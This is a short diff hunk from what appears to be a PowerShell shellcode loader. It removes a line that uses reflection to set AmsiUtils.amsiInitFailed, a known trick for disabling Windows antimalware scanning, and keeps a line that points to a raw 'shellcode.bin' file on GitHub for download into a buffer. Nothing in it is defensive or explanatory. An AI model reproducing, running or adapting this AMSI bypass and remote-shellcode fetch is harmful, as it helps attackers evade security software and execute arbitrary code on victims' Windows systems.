@@ -1,5 +1,3 @@
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-
 $url = "https://github.com/MJ06-BP/bp/raw/refs/heads/main/shellcode.bin"
 
 $buf = $null
